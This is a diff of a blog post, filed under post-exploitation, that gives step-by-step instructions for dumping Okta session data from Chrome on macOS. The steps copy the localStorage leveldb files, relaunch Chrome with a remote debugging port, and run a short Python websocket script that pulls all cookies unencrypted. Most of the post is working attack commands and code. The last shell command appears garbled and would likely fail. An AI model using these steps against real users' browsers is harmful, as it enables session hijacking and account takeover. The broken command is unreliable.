@@ -1,10 +1,50 @@
 ---
 layout: post
-title:  "Dumping Chrome Sessions"
+title:  "Dumping Okta Sessions in Chrome"
 date:   2024-11-17 03:00:00 -0600
 categories: post-exploitation
 ---
 
-Cookies
+# LocalStorage
 
-LocalStorage
+Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: `/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb`.
+
+To dump localStorage:
+* `git clone https://github.com/rdreher/chromeStorageDump`
+* Avoid a file lock, by first copying leveldb to /tmp
+* `cp -R "/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb" "/tmp/leveldb"`
+* `node chromeStorageDump.js -k okta-cache-storage "/tmp/leveldb"`
+
+# Cookies
+
+Google Chrome (macOS) cookies are saved in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetch by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
+
+* `killall Google\ Chrome`
+* `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session`
+
+The following `/json` endpoint provides a list of websocket addresses. 
+* `curl http://localhost:9222/json`
+
+Using a websocket client, connect to the correct address to reveal the unencrypted cookie in JSON format.
+
+* `pip3 install websocket`
+* `pip3 install websocket-client`
+
+#### **`ripWCMN.py`**
+```python
+import websocket
+ws = websocket.WebSocket()
+ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
+print(ws.recv())
+```
+
+* `python3 rip ripWCMN.py  | jq -c '.result.cookies[].name="idx"'`
+
+Credit: Justin Bui and @mangopdf
+
+### References:
+* https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies
+* https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec
+* https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f
+* https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
